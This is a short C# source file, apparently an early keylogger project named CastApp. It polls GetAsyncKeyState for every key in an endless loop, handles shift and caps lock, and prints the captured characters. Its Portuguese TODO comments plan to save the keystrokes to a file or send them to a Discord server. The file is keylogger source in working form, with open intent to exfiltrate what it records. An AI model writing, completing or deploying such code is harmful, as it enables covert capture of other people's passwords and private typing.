using System.Threading.Tasks;

namespace CastApp
{
    public class Program
    {
        private static void Main(string[] args)
        {
            //Todo
            // Criar uma especi de lopp para o programa onde captura as teclas e depois gravara num ficheiro ou poderiamos mandar para um server de discord
            // Tmb ter em atencao tornar o codigo legivel e sempre que possivel comentar para que os outros possam entender e trabalhar em conjunto
            // criei uma class chamada Natives para ser usada ja tem mais comentarios para vcs 
            Start();
        }

        protected static void Start()
        {
            while (true)
            {
                bool shift = (Natives.GetAsyncKeyState(160) & 0x8000) != 0 || (Natives.GetAsyncKeyState(161) & 0x8000) != 0;
                var capsLock = Console.CapsLock;

                for (int i = 0; i < 255; i++)
                {
                    short state = (short)Natives.GetAsyncKeyState(i);
                    if (state == 1 || state == -32767)
                    {
                        char c = GetCharFromKey(i, shift, capsLock);
                        Console.Write(c);
                    }
                }
            }
        }

        protected static char GetCharFromKey(int vkCode, bool shift, bool capsLock)
        {
            switch (vkCode)
            {
                case 8:
                    Console.Write("\b \b");
                    return '\0';

                case 13:
                    return '\n';

                case 9:
                    return '\t';

                case 32:
                    return ' ';

                case >= 65 and <= 90:
                    char c = (char)vkCode;
                    return (capsLock ^ shift) ? char.ToUpper(c) : char.ToLower(c);

                case 48: return shift ? ')' : '0';
                case 49: return shift ? '!' : '1';
                case 50: return shift ? '@' : '2';
                case 51: return shift ? '#' : '3';
                case 52: return shift ? '$' : '4';
                case 53: return shift ? '%' : '5';
                case 54: return shift ? '^' : '6';
                case 55: return shift ? '&' : '7';
                case 56: return shift ? '*' : '8';
                case 57: return shift ? '(' : '9';

                default:
                    return '\0';
            }
        }

    }
}